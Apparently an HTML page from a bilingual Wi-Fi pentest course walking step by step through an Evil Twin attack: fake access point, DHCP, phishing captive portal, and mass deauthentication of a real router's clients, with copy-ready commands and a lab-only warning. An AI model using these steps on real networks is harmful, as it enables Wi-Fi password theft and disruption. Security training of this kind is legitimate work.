@@ -1,0 +1,189 @@
+<!-- TRILHA EVIL TWIN — Fake AP + Captive Portal -->
+<div class="container-narrow" style="padding-top: var(--space-8); padding-bottom: var(--space-16);">
+
+    <div class="flex items-center gap-3" style="margin-bottom: var(--space-3);">
+        <a href="#/home" class="btn btn-ghost btn-sm"><i class="fa-solid fa-arrow-left"></i> <span data-lang-pt>Voltar</span><span data-lang-en>Back</span></a>
+        <span class="badge badge-advanced"><span data-lang-pt>⭐⭐⭐ Avançado</span><span data-lang-en>⭐⭐⭐ Advanced</span></span>
+    </div>
+    <div style="margin-bottom: var(--space-10);">
+        <h1 style="margin-bottom: var(--space-3);"><i class="fa-solid fa-ghost" style="color: var(--accent-danger);"></i> <span data-lang-pt>Trilha Evil Twin Attack</span><span data-lang-en>Evil Twin Attack Trail</span></h1>
+        <p class="text-muted" style="font-size: var(--fs-md); max-width: 650px;">
+            <span data-lang-pt>Crie um ponto de acesso falso que imita uma rede legítima. Quando a vítima se conectar ao seu AP, você pode interceptar credenciais com um captive portal falso.</span>
+            <span data-lang-en>Create a fake access point that mimics a legitimate network. When the victim connects to your AP, you can intercept credentials with a fake captive portal.</span>
+        </p>
+        <div style="margin-top: var(--space-4); max-width: 400px;">
+            <div class="flex justify-between items-center" style="margin-bottom: var(--space-2);">
+                <span class="text-sm text-muted"><span data-lang-pt>Progresso</span><span data-lang-en>Progress</span></span>
+                <span class="progress-label text-sm" style="color: var(--accent-danger);">0%</span>
+            </div>
+            <div class="progress-bar"><div class="progress-bar-fill" data-trail-progress="eviltwin" style="width: 0%; background: var(--accent-danger);"></div></div>
+        </div>
+    </div>
+
+    <!-- Inputs -->
+    <div class="card-flat" style="margin-bottom: var(--space-8); padding: var(--space-6);">
+        <h3 style="margin-bottom: var(--space-4); font-size: var(--fs-base);"><i class="fa-solid fa-sliders" style="color: var(--accent-danger);"></i> <span data-lang-pt>Configuração</span><span data-lang-en>Setup</span></h3>
+        <div class="form-row">
+            <div class="input-group">
+                <label><span data-lang-pt>Interface Monitor</span><span data-lang-en>Monitor Interface</span></label>
+                <input type="text" id="iface" value="wlan0" data-cmd-input>
+            </div>
+            <div class="input-group">
+                <label>BSSID (<span data-lang-pt>MAC do Roteador Alvo</span><span data-lang-en>Target Router MAC</span>)</label>
+                <input type="text" id="bssid" value="00:11:22:33:44:55" data-cmd-input>
+            </div>
+        </div>
+        <div class="form-row">
+            <div class="input-group">
+                <label><span data-lang-pt>Canal</span><span data-lang-en>Channel</span></label>
+                <input type="number" id="channel" value="6" min="1" max="14" data-cmd-input>
+            </div>
+            <div class="input-group">
+                <label>ESSID (<span data-lang-pt>Nome da Rede Alvo</span><span data-lang-en>Target Network Name</span>)</label>
+                <input type="text" id="essid" value="LabPentest_5G" data-cmd-input>
+            </div>
+        </div>
+    </div>
+
+    <div class="info-box info-danger" style="margin-bottom: var(--space-8);">
+        <i class="fa-solid fa-skull-crossbones"></i>
+        <span><span data-lang-pt><strong>Aviso:</strong> Este ataque envolve engenharia social e criação de infraestrutura falsa. Use <strong>apenas</strong> em seu próprio laboratório com dispositivos de teste.</span><span data-lang-en><strong>Warning:</strong> This attack involves social engineering and creating fake infrastructure. Use <strong>only</strong> in your own lab with test devices.</span></span>
+    </div>
+
+    <!-- FASE 1 -->
+    <div class="step-block reveal">
+        <div class="step-indicator" style="background: var(--accent-danger);">Fase 1</div>
+        <h2><i class="fa-solid fa-tower-broadcast"></i> <span data-lang-pt>Modo Monitor</span><span data-lang-en>Monitor Mode</span></h2>
+        <p class="lesson-text">
+            <span data-lang-pt>Primeiro, ative o modo monitor e escaneie as redes para identificar o alvo.</span>
+            <span data-lang-en>First, enable monitor mode and scan networks to identify the target.</span>
+        </p>
+        <div class="action-area">
+            <div class="action-title"><i class="fa-solid fa-terminal"></i> <span data-lang-pt>Comandos</span><span data-lang-en>Commands</span></div>
+            <div class="command-box" style="margin-bottom: var(--space-4);">
+                <code>sudo airmon-ng check kill</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <div class="command-box">
+                <code data-cmd="sudo airmon-ng start {iface}">sudo airmon-ng start wlan0</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+        </div>
+        <label class="step-check"><input type="checkbox" data-step="1"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>Modo monitor ativado</span><span data-lang-en>Monitor mode enabled</span></span></label>
+    </div>
+
+    <!-- FASE 2 -->
+    <div class="step-block reveal">
+        <div class="step-indicator" style="background: var(--accent-danger);">Fase 2</div>
+        <h2><i class="fa-solid fa-signal"></i> <span data-lang-pt>Criar o AP Falso</span><span data-lang-en>Create the Fake AP</span></h2>
+        <p class="lesson-text">
+            <span data-lang-pt>Use <code>airbase-ng</code> para criar um ponto de acesso falso com o <strong>mesmo nome (ESSID)</strong> da rede alvo. Isso cria uma interface virtual <code>at0</code> que será a "porta" para os clientes.</span>
+            <span data-lang-en>Use <code>airbase-ng</code> to create a fake access point with the <strong>same name (ESSID)</strong> as the target network. This creates a virtual interface <code>at0</code> that will be the "gateway" for clients.</span>
+        </p>
+        <div class="action-area">
+            <div class="action-title"><i class="fa-solid fa-ghost"></i> <span data-lang-pt>Iniciar AP Falso</span><span data-lang-en>Start Fake AP</span></div>
+            <div class="command-box">
+                <code data-cmd="sudo airbase-ng -e {essid} -c {channel} {ifaceMon}">sudo airbase-ng -e LabPentest_5G -c 6 wlan0mon</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <div class="info-box info-info">
+                <i class="fa-solid fa-circle-info"></i>
+                <span><span data-lang-pt>Deixe rodando e abra <strong>outro terminal</strong> para os próximos passos. A interface <code>at0</code> será criada.</span><span data-lang-en>Keep running and open <strong>another terminal</strong> for next steps. The <code>at0</code> interface will be created.</span></span>
+            </div>
+        </div>
+        <label class="step-check"><input type="checkbox" data-step="2"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>AP falso criado com at0</span><span data-lang-en>Fake AP created with at0</span></span></label>
+    </div>
+
+    <!-- FASE 3 -->
+    <div class="step-block reveal">
+        <div class="step-indicator" style="background: var(--accent-danger);">Fase 3</div>
+        <h2><i class="fa-solid fa-network-wired"></i> <span data-lang-pt>Configurar DHCP e Rede</span><span data-lang-en>Configure DHCP and Network</span></h2>
+        <p class="lesson-text">
+            <span data-lang-pt>Precisamos configurar a interface <code>at0</code> com um IP e subir um servidor DHCP para que os clientes recebam IP automaticamente ao conectar ao nosso AP falso.</span>
+            <span data-lang-en>We need to configure the <code>at0</code> interface with an IP and start a DHCP server so clients receive IP automatically when connecting to our fake AP.</span>
+        </p>
+        <div class="action-area">
+            <div class="action-title"><i class="fa-solid fa-server"></i> <span data-lang-pt>Configurar Interface</span><span data-lang-en>Configure Interface</span></div>
+            <span class="command-label"><span data-lang-pt>1. Atribuir IP à interface at0:</span><span data-lang-en>1. Assign IP to at0 interface:</span></span>
+            <div class="command-box" style="margin-bottom: var(--space-4);">
+                <code>sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0 up</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <span class="command-label"><span data-lang-pt>2. Configurar rota:</span><span data-lang-en>2. Configure route:</span></span>
+            <div class="command-box" style="margin-bottom: var(--space-4);">
+                <code>sudo route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <span class="command-label"><span data-lang-pt>3. Iniciar DHCP server (dnsmasq):</span><span data-lang-en>3. Start DHCP server (dnsmasq):</span></span>
+            <div class="command-box">
+                <code>sudo dnsmasq -C /dev/null -i at0 --dhcp-range=10.0.0.10,10.0.0.50,12h --no-daemon --log-queries</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+        </div>
+        <label class="step-check"><input type="checkbox" data-step="3"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>DHCP rodando — clientes recebem IP</span><span data-lang-en>DHCP running — clients receive IP</span></span></label>
+    </div>
+
+    <!-- FASE 4 -->
+    <div class="step-block reveal">
+        <div class="step-indicator" style="background: var(--accent-danger);">Fase 4</div>
+        <h2><i class="fa-solid fa-globe"></i> <span data-lang-pt>Captive Portal (Phishing)</span><span data-lang-en>Captive Portal (Phishing)</span></h2>
+        <p class="lesson-text">
+            <span data-lang-pt>Configure regras de <code>iptables</code> para redirecionar todo o tráfego HTTP para uma página falsa (captive portal) que pede a senha Wi-Fi. Use o <code>apache2</code> ou <code>python3 -m http.server</code> para servir a página.</span>
+            <span data-lang-en>Configure <code>iptables</code> rules to redirect all HTTP traffic to a fake page (captive portal) that asks for the Wi-Fi password. Use <code>apache2</code> or <code>python3 -m http.server</code> to serve the page.</span>
+        </p>
+        <div class="action-area">
+            <div class="action-title"><i class="fa-solid fa-filter"></i> <span data-lang-pt>Regras de Redirecionamento</span><span data-lang-en>Redirect Rules</span></div>
+            <span class="command-label"><span data-lang-pt>1. Redirecionar HTTP (porta 80) para o captive portal:</span><span data-lang-en>1. Redirect HTTP (port 80) to the captive portal:</span></span>
+            <div class="command-box" style="margin-bottom: var(--space-4);">
+                <code>sudo iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j REDIRECT --to-port 8080</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <span class="command-label"><span data-lang-pt>2. Servir a página de phishing:</span><span data-lang-en>2. Serve the phishing page:</span></span>
+            <div class="command-box">
+                <code>sudo python3 -m http.server 8080 --directory /path/to/portal/</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <div class="info-box info-info">
+                <i class="fa-solid fa-palette"></i>
+                <span><span data-lang-pt><strong>Dica:</strong> Crie uma página HTML que imite a tela de login do roteador do ISP da vítima. Quanto mais convincente, maior a taxa de sucesso.</span><span data-lang-en><strong>Tip:</strong> Create an HTML page that mimics the victim's ISP router login screen. The more convincing, the higher the success rate.</span></span>
+            </div>
+        </div>
+        <label class="step-check"><input type="checkbox" data-step="4"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>Captive portal funcionando</span><span data-lang-en>Captive portal working</span></span></label>
+    </div>
+
+    <!-- FASE 5 -->
+    <div class="step-block reveal">
+        <div class="step-indicator" style="background: var(--accent-danger);">Fase 5</div>
+        <h2><i class="fa-solid fa-burst"></i> <span data-lang-pt>Forçar Desconexão do AP Real</span><span data-lang-en>Force Disconnect from Real AP</span></h2>
+        <p class="lesson-text">
+            <span data-lang-pt>Agora, use <code>aireplay-ng</code> para desautenticar todos os clientes do AP <strong>real</strong>. Sem conexão, os dispositivos vão procurar o ESSID novamente e encontrarão nosso AP falso (que terá sinal mais forte se estivermos perto).</span>
+            <span data-lang-en>Now, use <code>aireplay-ng</code> to deauthenticate all clients from the <strong>real</strong> AP. Without a connection, devices will search for the ESSID again and find our fake AP (which will have a stronger signal if we're nearby).</span>
+        </p>
+        <div class="action-area">
+            <div class="action-title"><i class="fa-solid fa-bolt"></i> <span data-lang-pt>Deauth em massa (broadcast)</span><span data-lang-en>Mass deauth (broadcast)</span></div>
+            <div class="command-box">
+                <code data-cmd="sudo aireplay-ng -0 0 -a {bssid} {ifaceMon}">sudo aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0mon</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <div class="info-box info-warning">
+                <i class="fa-solid fa-triangle-exclamation"></i>
+                <span><span data-lang-pt><strong>-0 0</strong> = envio contínuo. Quando a vítima conectar ao seu AP e digitar a senha no portal, você verá no log do servidor HTTP. Para parar: <kbd>Ctrl+C</kbd>.</span><span data-lang-en><strong>-0 0</strong> = continuous sending. When the victim connects to your AP and enters the password in the portal, you'll see it in the HTTP server log. To stop: <kbd>Ctrl+C</kbd>.</span></span>
+            </div>
+        </div>
+        <label class="step-check"><input type="checkbox" data-step="5"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>Credenciais capturadas via captive portal</span><span data-lang-en>Credentials captured via captive portal</span></span></label>
+    </div>
+
+    <!-- Completion -->
+    <div class="card-flat reveal" style="text-align: center; padding: var(--space-10);">
+        <i class="fa-solid fa-trophy" style="font-size: 3rem; color: var(--accent-danger); margin-bottom: var(--space-4); display: block;"></i>
+        <h2><span data-lang-pt>Trilha Evil Twin Completa!</span><span data-lang-en>Evil Twin Trail Complete!</span></h2>
+        <p class="text-muted" style="margin-top: var(--space-2); margin-bottom: var(--space-6);">
+            <span data-lang-pt>Você dominou engenharia social em redes Wi-Fi!</span>
+            <span data-lang-en>You mastered social engineering on Wi-Fi networks!</span>
+        </p>
+        <div class="flex justify-center gap-4 flex-wrap">
+            <a href="#/pmkid" class="btn btn-primary"><i class="fa-solid fa-arrow-right"></i> PMKID</a>
+            <a href="#/home" class="btn btn-ghost"><i class="fa-solid fa-house"></i> <span data-lang-pt>Início</span><span data-lang-en>Home</span></a>
+        </div>
+    </div>
+</div>
